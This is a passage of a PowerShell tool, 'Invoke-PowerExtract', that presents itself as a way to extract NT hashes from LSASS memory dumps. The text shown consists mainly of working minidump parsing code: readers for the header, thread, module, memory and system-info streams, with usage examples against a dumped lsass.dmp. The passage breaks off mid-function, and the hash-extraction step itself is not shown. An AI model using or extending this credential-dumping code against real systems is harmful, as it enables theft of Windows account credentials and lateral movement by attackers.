<#
.SYNOPSIS
Invoke-PowerExtract

.DESCRIPTION
Invoke-PowerExtract parses and extracts information (e.g. NT-hashes) from memory dumps of the LSASS process. 

Author: Powerpointken 
License: BSD 3-Clause

.PARAMETER PathToDMP
Full path to the dump of the lsass process

.PARAMETER Debug
Switch for more output - default value false

.EXAMPLE
Parse a memory dump
Invoke-PowerExtract -PathToDMP C:\temp\lsass.dmp

.EXAMPLE
Parse a memory dump with debug output
Invoke-PowerExtract -PathToDMP C:\temp\lsass.dmp -Debug $true

.LINK
https://github.com/powerpointken

#>

Function Invoke-PowerExtract
{
param(
    $PathToDMP,
    [boolean]$Debug=$false
)





$Start = Get-Date
    Function Get-BytesFromHex {
    
        [cmdletbinding()]
    
        param(
            [parameter(Mandatory=$true)]
            [String]
            $String
        )
    
        $Bytes = [byte[]]::new($String.Length / 2)
    
        For($i=0; $i -lt $String.Length; $i+=2){
            $Bytes[$i/2] = [convert]::ToByte($String.Substring($i, 2), 16)
        }
    
        return $Bytes
        }
    
    Function Get-CharsFromHex
        {
        Param(
            $HexString
        )
       
        for($i = 0;$i -lt $HexString.Length;$i+=2)
            {
            $Part = $HexString.Substring($i,2)
            if($Part -ne "00")
                {
                $Chars += [char]([convert]::toint16($Part,16))
                }
            $Part = $null
            }
        return $Chars
    
        }
    
     
    function Convert-LitEdian
        {
        Param(
            [string]$String
        )
        $result=$null
        if(($String.Length % 2) -eq 0)
            {
            for($i=2;$i -le ($String.Length);$i=$i+2)
                {
                $result += $String.Substring($String.Length-$i,2)
                }
            }
        else
            {
            Write-Host "Length not good"
            }
    
        return $result
        }
    
    function Get-ProcessorArchitekture
            {
            param(
                $ProcessorArchitecture
            )
            $ProcessorArchitecture = [convert]::toint64(($ProcessorArchitecture),16)
            if($ProcessorArchitecture -eq 9)
                {
                $Architekture = "AMD64"
                }
            elseif($ProcessorArchitecture -eq 5)
                {
                $Architekture = "ARM"
                }
            elseif($ProcessorArchitecture -eq 6)
                {
                $Architekture = "IA64"
                }
            elseif($ProcessorArchitecture -eq 0)
                {
                $Architekture = "INTEL"
                }
            elseif($ProcessorArchitecture -eq 32771)
                {
                $Architekture = "ARM64"
                }
            else
                {
                $Architekture = "UNKNOWN"
                }
            return $Architekture
            }
    
    function Get-Suite-Mask 
        {
        param($SuiteMask)
    
        $SuiteMatches = @{
        0x00000004 = "VER_SUITE_BACKOFFICE" #Microsoft BackOffice components are installed.
        0x00000400 = "VER_SUITE_BLADE" #Windows Server 2003, Web Edition is installed.
        0x00004000 = "VER_SUITE_COMPUTE_SERVER" #Windows Server 2003, Compute Cluster Edition is installed.
        0x00000080 = "VER_SUITE_DATACENTER" #Windows Server 2008 R2 Datacenter, Windows Server 2008 Datacenter, or Windows Server 2003, Datacenter Edition is installed.
        0x00000002 = "VER_SUITE_ENTERPRISE" #Windows Server 2008 R2 Enterprise, Windows Server 2008 Enterprise, or Windows Server 2003, Enterprise Edition is installed.
        0x00000040 = "VER_SUITE_EMBEDDEDNT" #Windows Embedded is installed.
        0x00000200 = "VER_SUITE_PERSONAL" #Windows XP Home Edition is installed.
        0x00000100 = "VER_SUITE_SINGLEUSERTS" #Remote Desktop is supported, but only one interactive session is supported. This value is set unless the system is running in application server mode.
        0x00000001 = "VER_SUITE_SMALLBUSINESS" #Microsoft Small Business Server was once installed on the system, but may have been upgraded to another version of Windows.
        0x00000020 = "VER_SUITE_SMALLBUSINESS_RESTRICTED" #Microsoft Small Business Server is installed with the restrictive client license in force.
        0x00002000 = "VER_SUITE_STORAGE_SERVER" #Windows Storage Server is installed.
        0x00000010 = "VER_SUITE_TERMINAL" # Terminal Services is installed. This value is always set. If VER_SUITE_TERMINAL is set but VER_SUITE_SINGLEUSERTS is not set, the system is running in application server mode.
        }
        
        foreach($SuiteMatch in $SuiteMatches.Keys | Sort-Object -Descending){
            if($SuiteMask -band $SuiteMatch)
                {
                $Mask += $SuiteMatches[$SuiteMatch] + ";"
                }
        }
    
        return $Mask
        }
    
    Function Get-ProductType
        {
        param(
            $RawProductType
        )
        
        if($RawProductType -eq "00")
            {
            $ProdType = "Unidentified"
            }
        elseif($RawProductType -eq "01")
            {
            $ProdType = "NT_Workstation"
            }
        elseif($RawProductType -eq "02")
            {
            $ProdType = "NT_Domain_Controller"
            }
        elseif($RawProductType -eq "03")
            {
            $ProdType = "NT_SERVER"
            }
        Return $ProdType
        }
    
    function Get-OS
        {
        param(
            $ProdType,
            $Major_Version,
            $Minor_Version
        )
        $strProductType = Get-ProductType -RawProductType $ProdType
        $Major_Version = [convert]::toint64(($Major_Version).trim(),16)
        $Minor_Version = [convert]::toint64(($Minor_Version).trim(),16)
    
    
        if($Major_Version -eq "10"  -and $Minor_Version -eq "00" -and $strProductType -eq "NT_Workstation")
            {
            $OperatingSystem = "Windows 10"
            }
        elseif($Major_Version -eq "10"  -and $Minor_Version -eq "00" -and $strProductType -ne "NT_Workstation")
            {
            $OperatingSystem = "Windows Server 2016"
            }
        elseif($Major_Version -eq "06"  -and $Minor_Version -eq "03" -and $strProductType -eq "NT_Workstation")
            {
            $OperatingSystem = "Windows 8.1"
            }
        elseif($Major_Version -eq "06"  -and $Minor_Version -eq "03" -and $strProductType -ne "NT_Workstation")
            {
            $OperatingSystem = "Windows Server 2012 R2"
            }
        elseif($Major_Version -eq "06"  -and $Minor_Version -eq "02" -and $strProductType -eq "NT_Workstation")
            {
            $OperatingSystem = "Windows 8"
            }
        elseif($Major_Version -eq "06"  -and $Minor_Version -eq "02" -and $strProductType -ne "NT_Workstation")
            {
            $OperatingSystem = "Windows Server 2012"
            }
        elseif($Major_Version -eq "06"  -and $Minor_Version -eq "01" -and $strProductType -eq "NT_Workstation")
            {
            $OperatingSystem = "Windows 7"
            }
        elseif($Major_Version -eq "06"  -and $Minor_Version -eq "01" -and $strProductType -ne "NT_Workstation")
            {
            $OperatingSystem = "Windows Server 2008 R2"
            }
        elseif($Major_Version -eq "06"  -and $Minor_Version -eq "00" -and $strProductType -eq "NT_Workstation")
            {
            $OperatingSystem = "Windows Vista"
            }
        elseif($Major_Version -eq "06"  -and $Minor_Version -eq "00" -and $strProductType -ne "NT_Workstation")
            {
            $OperatingSystem = "Windows Server 2008"
            }
        elseif($Major_Version -eq "05"  -and $Minor_Version -eq "01")
            {
            $OperatingSystem = "Windows XP"
            }
        elseif($Major_Version -eq "05"  -and $Minor_Version -eq "00")
            {
           $OperatingSystem = "Windows 2000"
            }
    
        return $OperatingSystem
        }
    
    function Get-DumpFlags
        {
        param(
            $DumFlags
        )
    
        if($DumFlags -eq "00000001")
            {
            $DFlags = "THREAD_INFO_ERROR_THREAD"
            }
        elseif($DumFlags -eq "00000004")
            {
            $DFlags = "THREAD_INFO_EXITED_THREAD"
            }
        elseif($DumFlags -eq "00000010")
            {
            $DFlags = "THREAD_INFO_INVALID_CONTEXT"
            }
        elseif($DumFlags -eq "00000008")
            {
            $DFlags = "THREAD_INFO_INVALID_INFO"
            }
        elseif($DumFlags -eq "00000020")
            {
            $DFlags = "THREAD_INFO_INVALID_TEB"
            }
        elseif($DumFlags -eq "00000002")
            {
            $DFlags = "THREAD_INFO_WRITING_THREAD"
            }
        else
            {
            $DFlags = "None"
            }
    
        return $DFlags
        }
    
    Function Get-MemoryState
        {
        param(
            $RawMemoryState
        )
        if($RawMemoryState -eq "00001000")
            {
            $MState = "MEM_COMMIT"
            }
        elseif($RawMemoryState -eq "00010000")
            {
            $MState = "MEM_FREE"
            }
        elseif($RawMemoryState -eq "00002000")
            {
            $MState = "MEM_RESERVE"
            }
        else
            {
            $MState = "None"
            }
        return $MState
        }
    
    Function Get-MemoryType
        {
        param(
            $RawMemType
        )
        if($RawMemType -eq "01000000")
            {
            $MType = "MEM_IMAGE"
            }
        elseif($RawMemType -eq "00040000")
            {
            $MType = "MEM_MAPPED"
            }
        elseif($RawMemType -eq "00020000")
            {
            $MType = "MEM_PRIVATE"
            }
        else
            {
            $MType = "None"
            }
        return $MType
        }
    
    Function Get-AllocationProtect
        {
        param(
            $RawAllProtect
        )
    
        if($RawAllProtect -eq "00000010")
            {
            $AllProtect = "PAGE_EXECUTE"
            }
        elseif($RawAllProtect -eq "00000020")
            {
            $AllProtect = "PAGE_EXECUTE_READ"
            }
        elseif($RawAllProtect -eq "00000040")
            {
            $AllProtect = "PAGE_EXECUTE_READWRITE"
            }
        elseif($RawAllProtect -eq "00000080")
            {
            $AllProtect = "PAGE_EXECUTE_WRITECOPY"
            }
        elseif($RawAllProtect -eq "00000001")
            {
            $AllProtect = "PAGE_NOACCESS"
            }
        elseif($RawAllProtect -eq "00000002")
            {
            $AllProtect = "PAGE_READONLY"
            }
        elseif($RawAllProtect -eq "00000004")
            {
            $AllProtect = "PAGE_READWRITE"
            }
        elseif($RawAllProtect -eq "00000008")
            {
            $AllProtect = "PAGE_WRITECOPY"
            }
        elseif($RawAllProtect -eq "40000000")
            {
            $AllProtect = "PAGE_TARGETS_INVALID"
            }
        elseif($RawAllProtect -eq "00000100")
            {
            $AllProtect = "PAGE_GUARD"
            }
        elseif($RawAllProtect -eq "00000200")
            {
            $AllProtect = "PAGE_NOCACHE"
            }
        elseif($RawAllProtect -eq "00000400")
            {
            $AllProtect = "PAGE_WRITECOMBINE"
            }
        else
            {
            $AllProtect = "None"
            }
        return $AllProtect 
        }
    
    function Get-Header
        {
        param(
            $PathToDMP
        )
    
    
    
        $fileStream = New-Object –TypeName System.IO.FileStream –ArgumentList ($PathToDMP, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read)
        $fileReader = New-Object –TypeName System.IO.BinaryReader –ArgumentList $fileStream
    
        $fileReader.BaseStream.Position=0
        $Signature = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
    
        $Version = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(2))).replace('-','')
    
        $ImplementationVersion = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(2))).replace('-','')
        $NumberOfStreams = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
    
        $StreamDirectoryRva = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
    
    
        $CheckSum = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
    
        $Reserved = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
    
        $TimeDateStamp = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
    
        $Flags = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
    
        $MinidumpHeader = New-Object -Type psobject -Property (@{
            "Signature"=$Signature
            "Version"=$Version
            "ImplementationVersion"=$ImplementationVersion
            "NumberOfStreams"=$NumberOfStreams
            "StreamDirectoryRva"=$StreamDirectoryRva
            "CheckSum"=$CheckSum
            "Reserved"=$Reserved
            "Flags"=$Flags
            })
        return $MinidumpHeader
        }
    
    function Get-ThreadListStream
    {
        param(
            $PathToDMP,
            $ThreadStream
        )
    
        $fileStream = New-Object –TypeName System.IO.FileStream –ArgumentList ($PathToDMP, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read)
        $fileReader = New-Object –TypeName System.IO.BinaryReader –ArgumentList $fileStream
        $fileReader.BaseStream.Seek([convert]::toint64(($ThreadStream.Location.RVA).trim(),16),[System.IO.SeekOrigin]::Begin) | Out-Null
    
    
        $NumberOfThreads = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
        $NumberOfThreads = [convert]::toint64(($NumberOfThreads).trim(),16)
    
        $Threads = @()
    
        for($i=0;$i -le $NumberOfThreads;$i++)
            {
            $ThreadID = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
            $SuspendCount = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
            $PriorityClass = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
            $Priority = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
            $Teb = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
            
            $Memory_Descriptor_StartofMemoryRange = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
            $Localtion_Descriptor_DataSize = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
            $Localtion_Descriptor_RVA = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')   
    
            $Stack = New-Object -Type psobject -Property (@{
                    "Start" = $Memory_Descriptor_StartofMemoryRange
                    "DataSize" = $Localtion_Descriptor_DataSize
                    "RVA" = $Localtion_Descriptor_RVA
                    })
            
            $Localtion_Descriptor_DataSize = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
            $Localtion_Descriptor_RVA = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')    
            $ThreadContext = New-Object -Type psobject -Property (@{
                    "DataSize" = $Localtion_Descriptor_DataSize
                    "RVA" = $Localtion_Descriptor_RVA
                    })
    
    
            $Thread = New-Object -Type psobject -Property (@{
                    "ThreadID" = $ThreadID
                    "SuspendCount" = $SuspendCount
                    "PriorityClass" = $PriorityClass
                    "Priority" = $Priority
                    "Teb" = $Teb
                    "Stack" = $Stack
                    "ThreadContext" = $ThreadContext
                    })
            $Threads += $Thread
            }
    
    return $Threads
    }
    
    function Get-ModuleStream
        {
        param(
            $ModuleStream,
            $PathToDMP
        )
    
        $fileStream = New-Object –TypeName System.IO.FileStream –ArgumentList ($PathToDMP, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read)
        $fileReader = New-Object –TypeName System.IO.BinaryReader –ArgumentList $fileStream
        $fileReader.BaseStream.Seek([convert]::toint64(($ModuleStream.Location.RVA).trim(),16),[System.IO.SeekOrigin]::Begin)  | Out-Null
        
        $NumberOfModules = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
        $NumberOfModules = [convert]::toint64(($NumberOfModules).trim(),16)
    
        $Modules = @()
    
        for($i=0;$i -lt $NumberOfModules;$i++)
            {
            $BaseOfImage = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','') 
            $SizeOfImage = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','') 
            $CheckSum = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','') 
            $TimeDateStamp = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','') 
            $ModuleNameRva = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','') 
    
            $dwSignature = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
            $dwStrucVersion = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
            $dwFileVersionMS = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
            $dwFileVersionLS = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
            $dwProductVersionMS = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
            $dwProductVersionLS = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
            $dwFileFlagsMask = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
            $dwFileFlags = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
            $dwFileOS = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
            $dwFileType = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
            $dwFileSubtype = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
            $dwFileDateMS = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
            $dwFileDateLS = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
    
            $VersionInfo = New-Object -Type psobject -Property (@{
                    "dwSignature" = $dwSignature
                    "dwStrucVersion" = $dwStrucVersion
                    "dwFileVersionMS" = $dwFileVersionMS
                    "dwFileVersionLS" = $dwFileVersionLS
                    "dwProductVersionMS" = $dwProductVersionMS
                    "dwProductVersionLS" = $dwProductVersionLS
                    "dwFileFlagsMask" = $dwFileFlagsMask
                    "dwFileFlags" = $dwFileFlags
                    "dwFileOS" = $dwFileOS
                    "dwFileType" = $dwFileType
                    "dwFileSubtype" = $dwFileSubtype
                    "dwFileDateMS" = $dwFileDateMS
                    "dwFileDateLS" = $dwFileDateLS
                    })
    
            $Localtion_Descriptor_DataSize = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
            $Localtion_Descriptor_RVA = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')    
            $CvRecord = New-Object -Type psobject -Property (@{
                    "DataSize" = $Localtion_Descriptor_DataSize
                    "RVA" = $Localtion_Descriptor_RVA
                    })
    
            $Localtion_Descriptor_DataSize = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
            $Localtion_Descriptor_RVA = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')    
            $MiscRecord = New-Object -Type psobject -Property (@{
                    "DataSize" = $Localtion_Descriptor_DataSize
                    "RVA" = $Localtion_Descriptor_RVA
                    })
    
            $Reserved0 = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','') 
            $Reserved1 = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','') 
    
        
            $MINIDUMP_MODULE = New-Object -Type psobject -Property (@{
                    "BaseAddress" = $BaseOfImage
                    "BaseOfImage" = $BaseOfImage
                    "Size" = $SizeOfImage
                    "SizeOfImage" = $SizeOfImage
                    "CheckSum" = $CheckSum
                    "TimeDateStamp" = $TimeDateStamp
                    "ModuleNameRva" = $ModuleNameRva
                    "VersionInfo" = $VersionInfo
                    "CvRecord" = $CvRecord
                    "MiscRecord" = $MiscRecord
                    "Reserved0" = $Reserved0
                    "Reserved1" = $Reserved1
                    })
            $Modules += $MINIDUMP_MODULE
            }
    
        foreach($Module in $Modules)
            {
            $fileReader.BaseStream.Seek([convert]::toint64(($Module.ModuleNameRva).trim(),16),[System.IO.SeekOrigin]::Begin)  | Out-Null
            $NameLength = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
            $RawModuleName = ([System.BitConverter]::ToString($fileReader.ReadBytes([convert]::toint64(($NameLength).trim(),16)))).replace('-','')
            $ModuleName = Get-CharsFromHex -HexString $RawModuleName
            Add-Member -InputObject $Module -name "ModuleName" -Value $ModuleName -MemberType NoteProperty
        
            $ModuleEndAddress = "{0:x16}" -f ([convert]::toint64(($Module.BaseAddress).trim(),16) + [convert]::toint64(($Module.Size).trim(),16))
            Add-Member -InputObject $Module -name "EndAddress" -Value $ModuleEndAddress -MemberType NoteProperty
            }
        return $Modules
        }
    
    function Get-Memory64Stream
        {
        param(
            $Memory64Stream,
            $PathToDMP
        )
    
        $fileStream = New-Object –TypeName System.IO.FileStream –ArgumentList ($PathToDMP, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read)
        $fileReader = New-Object –TypeName System.IO.BinaryReader –ArgumentList $fileStream
        $fileReader.BaseStream.Seek([convert]::toint64(($Memory64Stream.Location.RVA).trim(),16),[System.IO.SeekOrigin]::Begin) | Out-Null
        
        $NumberOfMemoryRanges64 = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
        $NumberOfMemoryRanges64 = [convert]::toint64(($NumberOfMemoryRanges64).trim(),16)
        $MemoryRanges64BaseRVA = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
    
        $MemoryRanges64 = @()
    
        for($i=0;$i -le $NumberOfMemoryRanges64;$i++)
            {
            $StartOfMemoryRange = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','') 
            $DataSize = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','') 
            $Memory_Decriptor64 = New-Object -Type psobject -Property (@{
                "StartOfMemoryRange" = $StartOfMemoryRange
                "DataSize" = $DataSize
                })
            $MemoryRanges64 += $Memory_Decriptor64
            }
    
        foreach($MemoryRange64 in $MemoryRanges64)
            {
    
            $fileReader.BaseStream.Seek([convert]::toint64(($MemoryRanges64BaseRVA).trim(),16),[System.IO.SeekOrigin]::Begin)  | Out-Null
    
            $Start_virtual_Address = $MemoryRange64.StartOfMemoryRange
            $Size = $MemoryRange64.DataSize
            $Start_File_Address = $MemoryRanges64BaseRVA
            $End_virutal_Address = "{0:x16}" -f ([convert]::toint64(($MemoryRange64.StartOfMemoryRange).trim(),16) + [convert]::toint64(($MemoryRange64.DataSize).trim(),16))
        
            $MemoryRanges64BaseRVA = "{0:x16}" -f ([convert]::toint64(($MemoryRanges64BaseRVA).trim(),16) + [convert]::toint64(($MemoryRange64.DataSize).trim(),16))
        
            Add-Member -InputObject $MemoryRange64 -name "Start_virtual_Address" -Value $Start_virtual_Address -MemberType NoteProperty
            Add-Member -InputObject $MemoryRange64 -name "Size" -Value $Size -MemberType NoteProperty
            Add-Member -InputObject $MemoryRange64 -name "Start_File_Address" -Value $Start_File_Address -MemberType NoteProperty
            Add-Member -InputObject $MemoryRange64 -name "End_virutal_Address" -Value $End_virutal_Address -MemberType NoteProperty
            }
    
        return $MemoryRanges64
        }
    
    function Get-SystemInfoStream
        {
        param(
            $SystemInfoStream,
            $PathToDMP
        )
        
        $fileStream = New-Object –TypeName System.IO.FileStream –ArgumentList ($PathToDMP, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read)
        $fileReader = New-Object –TypeName System.IO.BinaryReader –ArgumentList $fileStream
        $fileReader.BaseStream.Seek([convert]::toint64(($SystemInfoStream.Location.RVA).trim(),16),[System.IO.SeekOrigin]::Begin)  | Out-Null
    
        $ProcessorArchitecture = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(2))).replace('-','')
        $ProcessorLevel = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(2))).replace('-','')
        $ProcessorRevision = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(2))).replace('-','')
    
        $NumberOfProcessors = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(1))).replace('-','')
        $ProductType = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(1))).replace('-','')
        $MajorVersion= Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','') 
        $MinorVersion = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
        $BuildNumber = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
        $PlatformId = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
        $CSDVersionRVA = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
        $SuiteMask = Get-Suite-Mask -SuiteMask ([convert]::toint64((Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(2))).replace('-','')).trim(),16))
        $Reserved2 = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(2))).replace('-','')
    
        if((Get-ProcessorArchitekture -ProcessorArchitecture ([convert]::toint64(($ProcessorArchitecture),16))) -eq "INTEL")
            {
            for($i=0;$i -lt 3;$i++)
                {
                $VendorID +=  Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
                }
            $VersionInformation = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
            $FeatureInformation = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
            $AMDExtendedCpuFeatures = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
            }
        else
            {
            for($i=0;$i -lt 2;$i++)
                {
                $ProcessorFeatures +=  Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
                }
            }
    
        $fileReader.BaseStream.Seek([convert]::toint64(($CSDVersionRVA).trim(),16),[System.IO.SeekOrigin]::Begin)  | Out-Null
        $NameLength = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
        $RawCSDVersion = ([System.BitConverter]::ToString($fileReader.ReadBytes([convert]::toint64(($NameLength).trim(),16)))).replace('-','')
        $CSDVersion = Get-CharsFromHex -HexString $RawCSDVersion
        $OS = Get-OS -ProdType $ProductType -Major_Version $MajorVersion -Minor_Version $MinorVersion
    
        $SystemInfo = New-Object -Type psobject -Property (@{
            "ProcessorArchitecture" = (Get-ProcessorArchitekture -ProcessorArchitecture $ProcessorArchitecture)
            "ProcessorLevel" = $ProcessorLevel
            "ProcessorRevision" = $ProcessorRevision
            "NumberOfProcessors" = $NumberOfProcessors
            "ProductType" = $ProductType
            "MajorVersion" = $MajorVersion
            "MinorVersion" = $MinorVersion
            "BuildNumber" = $BuildNumber
            "PlatformID" = $PlatformId
            "CSDVersion" = $CSDVersion
            "SuiteMask" = $SuiteMask
            "VendorID" = $VendorID
            "VersionInformation" = $VersionInformation
            "FeatureInformation" = $FeatureInformation
            "AMDExtendedCpuFeatures" = $AMDExtendedCpuFeatures
            "ProcessorFeatures" = $ProcessorFeatures
            "OS" = $OS
            })
    
        Return $SystemInfo
        }
    
    function Get-ThreadInfoStream
        {
        param(
            $ThreadInfoStream,
            $PathToDMP
        )
        $fileStream = New-Object –TypeName System.IO.FileStream –ArgumentList ($PathToDMP, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read)
        $fileReader = New-Object –TypeName System.IO.BinaryReader –ArgumentList $fileStream
        $fileReader.BaseStream.Seek([convert]::toint64(($ThreadInfoStream.Location.RVA).trim(),16),[System.IO.SeekOrigin]::Begin) | Out-Null
        
        $ThreadInfos =  @()
    
        $SizeOfHeader = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
        $SizeOfEntry = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
        $NumberOfThreadsInfo = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
        $NumberOfThreadsInfo = [convert]::toint64(($NumberOfThreadsInfo).trim(),16)
    
        for($i=0;$i -lt $NumberOfThreadsInfo;$i++)
            {
            $ThreadInfoID = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
            $RawDumpFlags = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
            $DumpFlags = Get-DumpFlags -DumFlags $RawDumpFlags
            if($DumpFlags -eq "None")
                {
                $fileReader.BaseStream.Position=($fileReader.BaseStream.Position - 4)
                }
            $DumpError = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
            $Exitstatus = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
            $CreateTime = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
            $ExitTime = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
            $KernelTime = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
            $UserTime = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
            $StartAddress = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
            $Affinity = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
            $ThreadInfo = New-Object -Type psobject -Property (@{
                    "ThreadInfoID" = $ThreadInfoID
                    "DumpFlags" =$DumpFlags
                    "DumpError" = $DumpError
                    "Exitstatus" = $Exitstatus
                    "CreateTime" = $CreateTime
                    "ExitTime" = $ExitTime 
                    "KernelTime" = $KernelTime
                    "UserTime" = $UserTime
                    "StartAddress" = $StartAddress
                    "Affinity" = $Affinity
                    })
            $ThreadInfos += $ThreadInfo
            }
        return $ThreadInfos
        }
    
    function Get-UnloadedModuleListStream
        {
        param(
            $UnloadedModuleListStream,
            $PathToDMP
        )
        $fileStream = New-Object –TypeName System.IO.FileStream –ArgumentList ($PathToDMP, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read)
        $fileReader = New-Object –TypeName System.IO.BinaryReader –ArgumentList $fileStream
        $fileReader.BaseStream.Seek([convert]::toint64(($UnloadedModuleListStream.Location.RVA).trim(),16),[System.IO.SeekOrigin]::Begin) | Out-Null
        
        $UnloadedModules =  @()
    
